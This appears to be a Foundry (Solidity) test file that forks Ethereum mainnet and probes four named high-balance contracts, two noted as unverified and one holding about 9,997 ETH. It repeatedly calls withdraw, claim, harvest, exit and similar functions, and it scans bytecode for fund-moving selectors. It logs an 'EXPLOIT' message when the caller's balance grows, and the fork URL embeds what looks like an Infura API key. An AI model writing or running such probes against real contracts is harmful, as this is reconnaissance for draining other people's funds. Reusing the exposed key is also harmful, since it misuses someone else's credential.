// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IGenericWithdraw {
    function withdraw(uint256 amount) external;
    function withdraw() external;
    function emergencyWithdraw() external;
    function claim() external;
    function claim(uint256) external;
    function claimRewards() external;
    function harvest() external;
    function exit() external;
}

interface IGenericStaking {
    function stake(uint256 amount) external;
    function deposit(uint256 amount) external;
    function deposit() external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ProbeContractsTest is Test {
    address[] targets = [
        0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d,  // 9,997 ETH unverified
        0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329,  // 3,274 ETH unverified
        0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0,  // 800 ETH
        0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83   // 400 ETH
    ];

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testProbeWithdrawFunctions() public {
        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            if (target.balance < 10 ether) continue;

            console.log("\n=== Probing:", target, "===");
            console.log("Balance:", target.balance / 1e18, "ETH");

            // Try various withdraw functions
            try IGenericWithdraw(target).withdraw() {
                console.log("withdraw() succeeded!");
                console.log("Attacker balance:", address(this).balance / 1e18);
            } catch {}

            try IGenericWithdraw(target).emergencyWithdraw() {
                console.log("emergencyWithdraw() succeeded!");
            } catch {}

            try IGenericWithdraw(target).claim() {
                console.log("claim() succeeded!");
            } catch {}

            try IGenericWithdraw(target).claimRewards() {
                console.log("claimRewards() succeeded!");
            } catch {}

            try IGenericWithdraw(target).harvest() {
                console.log("harvest() succeeded!");
            } catch {}

            try IGenericWithdraw(target).exit() {
                console.log("exit() succeeded!");
            } catch {}
        }
    }

    // Probe the unverified contract with 9997 ETH
    function testProbeHighValueUnverified() public {
        address target = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d;
        console.log("Target balance:", target.balance / 1e18, "ETH");

        // Get bytecode and analyze
        bytes memory code = target.code;
        console.log("Code size:", code.length);

        // Try common function selectors
        bytes4[] memory selectors = new bytes4[](20);
        selectors[0] = bytes4(keccak256("withdraw(uint256)"));
        selectors[1] = bytes4(keccak256("withdraw()"));
        selectors[2] = bytes4(keccak256("withdrawAll()"));
        selectors[3] = bytes4(keccak256("emergencyWithdraw()"));
        selectors[4] = bytes4(keccak256("claim()"));
        selectors[5] = bytes4(keccak256("claim(uint256)"));
        selectors[6] = bytes4(keccak256("claimReward()"));
        selectors[7] = bytes4(keccak256("claimRewards()"));
        selectors[8] = bytes4(keccak256("harvest()"));
        selectors[9] = bytes4(keccak256("exit()"));
        selectors[10] = bytes4(keccak256("transfer(address,uint256)"));
        selectors[11] = bytes4(keccak256("transferETH(address,uint256)"));
        selectors[12] = bytes4(keccak256("sendETH(address,uint256)"));
        selectors[13] = bytes4(keccak256("sweepETH()"));
        selectors[14] = bytes4(keccak256("collectETH()"));
        selectors[15] = bytes4(keccak256("getReward()"));
        selectors[16] = bytes4(keccak256("compound()"));
        selectors[17] = bytes4(keccak256("redeem()"));
        selectors[18] = bytes4(keccak256("redeem(uint256)"));
        selectors[19] = bytes4(keccak256("execute()"));

        console.log("\nChecking function selectors in bytecode...");
        for (uint i = 0; i < selectors.length; i++) {
            if (containsSelector(code, selectors[i])) {
                console.log("Found selector:", vm.toString(selectors[i]));
            }
        }

        // Try calling without parameters
        uint256 balBefore = address(this).balance;
        (bool success, ) = target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
        if (success && address(this).balance > balBefore) {
            console.log("!!! EXPLOIT: withdraw() works !!!");
        }
    }

    function containsSelector(bytes memory code, bytes4 selector) internal pure returns (bool) {
        for (uint i = 0; i < code.length - 3; i++) {
            if (code[i] == selector[0] &&
                code[i+1] == selector[1] &&
                code[i+2] == selector[2] &&
                code[i+3] == selector[3]) {
                return true;
            }
        }
        return false;
    }

    receive() external payable {}
}
